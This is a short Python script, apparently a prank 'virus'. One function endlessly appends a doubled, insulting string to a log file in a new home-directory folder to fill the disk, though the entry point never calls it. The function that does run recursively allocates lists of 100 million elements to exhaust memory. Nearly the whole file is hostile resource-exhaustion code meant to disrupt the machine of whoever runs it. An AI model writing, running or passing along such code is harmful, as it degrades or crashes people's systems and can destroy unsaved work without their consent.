import os
import pathlib
import sys

def main():
    main_path = pathlib.Path.home() / "virus_prof"
    log_path = main_path / "log.txt"

    # Create the directory if it doesn't exist
    main_path.mkdir(exist_ok=True)

    # Create/append to a file that endlessly loops
    prank_str = "hahahahaha get pranked idiot. \n"
    while True:
        with open(log_path, 'a') as f:
            for _ in range(23):
                if len(prank_str) < 1e6:  # Limit the size of prank_str to 1 million characters
                  prank_str += prank_str
            f.write(prank_str)
    
    main()

def consume_memory():
  sys.stdout = open('output.txt', 'w')
  for i in range(9999):
    try:
        large_list = [0] * int(1e8)  # Create a list with 100 million elements
        consume_memory()  # Call the function recursively
    except MemoryError:
        print("break")
        break

if __name__ == "__main__":
    consume_memory()